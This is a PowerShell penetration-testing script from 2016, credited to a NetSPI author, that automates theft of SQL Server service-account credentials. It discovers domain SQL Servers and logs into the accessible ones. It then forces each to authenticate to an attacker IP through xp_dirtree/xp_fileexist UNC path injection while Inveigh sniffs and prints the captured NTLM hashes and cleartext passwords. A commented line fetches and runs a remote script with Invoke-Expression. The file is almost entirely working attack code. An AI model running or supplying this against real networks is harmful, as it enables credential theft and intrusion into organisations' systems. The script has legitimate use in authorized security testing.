# author: scott sutherland (@_nullbind), NetSPI 2016
# script name: Get-SQLServiceAccountPwHash.ps1
# requirements: PowerUpSQL and Inveigh
# description: locate domain sql servers, attempt login, unc path inject to capture password hash of associated service account.
# example: Get-SQLServiceAccountPwHashes -Verbose -CaptureIp 10.1.1.12
# Note: alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe

Function Get-SQLServiceAccountPwHashes {

    [CmdletBinding()]
    Param(
      [Parameter(Mandatory=$false)]
       [string]$Username,
	
       [Parameter(Mandatory=$false)]
       [string]$Password,

       [Parameter(Mandatory=$false)]
       [string]$DomainController,

       [Parameter(Mandatory=$true)]
       [string]$CaptureIp,

       [Parameter(Mandatory=$false)]
       [int]$TimeOut = 5
    )

    Begin 
    {
        # Attempt to load Inveigh via reflection - naturally this bombs if there is no outbound internet - just load it manually for the demo
        # Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')

        $TestIt = Test-Path -Path Function:\Invoke-Inveigh
        if($TestIt -eq 'True')
        {
            Write-Verbose -Message "Inveigh loaded."
        }else{
            Write-Verbose -Message "Inveigh NOT loaded."
            return
        }
    }

    Process
    {
        # Discover SQL Servers on the Domain via LDAP queries for SPN records
        Write-Verbose "Testings access to domain sql servers..."
        $SQLServerInstances = Get-SQLInstanceDomain -verbose -CheckMgmt -DomainController $DomainController -Username $Username -Password $Password | Get-SQLConnectionTestThreaded -Verbose -Threads 15 
        $SQLServerInstancesCount = $SQLServerInstances.count
        Write-output "$SQLServerInstancesCount SQL Server instances found"

        # Get list of SQL Servers that the provided account can log into
        $AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
        $AccessibleSQLServersCount = $AccessibleSQLServers.count

        # Status user
        Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
        Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."

        # Start sniffing
        Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 

        # Perform unc path injection on each one
        $AccessibleSQLServers | 
        ForEach-Object{
    
            # Get current instance
            $CurrentInstance = $_.Instance

            # Start unc path injection for each interface
            Write-Output "$CurrentInstance - Injecting UNC path to \\$CaptureIp\file"

            # Functions executable by the Public role that accept UNC paths
            Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$CaptureIp\file'" -SuppressVerbose | out-null	
            Get-SQLQuery -Instance $CurrentInstance -Query "xp_fileexist '\\$CaptureIp\file'" -SuppressVerbose | out-null	
   
            # Sleep to give the SQL Server time to send us hashes :)
            sleep $TimeOut
 
            # Get hashes
            Write-Verbose "Captured password hashes:"
            Get-InveighCleartext | Sort-Object
            Get-InveighNTLMv1 | Sort-Object
            Get-InveighNTLMv2 | Sort-Object           
        }
    }

    End
    {
        # Return results
        Write-Output "---------------------------------------"
        Write-Output "Final List of Captured password hashes:"
        Write-Output "---------------------------------------"
        Get-InveighCleartext | Sort-Object
        Get-InveighNTLMv1 | Sort-Object
        Get-InveighNTLMv2 | Sort-Object

        # Stop sniffing
        Stop-Inveigh | Out-Null 

        # Clear cache
        Clear-Inveigh | Out-Null 
    }
}

